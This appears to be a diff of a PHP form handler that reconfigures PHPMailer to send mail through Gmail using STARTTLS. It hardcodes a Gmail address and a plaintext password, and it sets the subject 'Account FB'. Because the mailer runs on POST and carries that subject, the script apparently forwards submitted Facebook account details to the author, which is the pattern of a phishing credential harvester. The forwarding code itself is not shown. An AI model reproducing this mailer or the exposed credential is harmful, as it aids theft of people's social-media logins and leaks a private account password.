@@ -16,12 +16,14 @@ if($_POST){
     
         $mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
         $mail->SMTPAuth = true; // authentication enabled
-        $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
+        // $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
+        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
         $mail->Host = "smtp.gmail.com";
-        $mail->Port = 465; // or 587
-        $mail->IsHTML(true);
+        $mail->Port = 587; // or 587
+    
         $mail->Username = "huynguyen66028@gmail.com";
         $mail->Password = "anphawolf@%)$1997";
+      
         $mail->SetFrom("huynguyen66028@gmail.com","Huy Nguyen");
         
         $mail->Subject = 'Account FB';
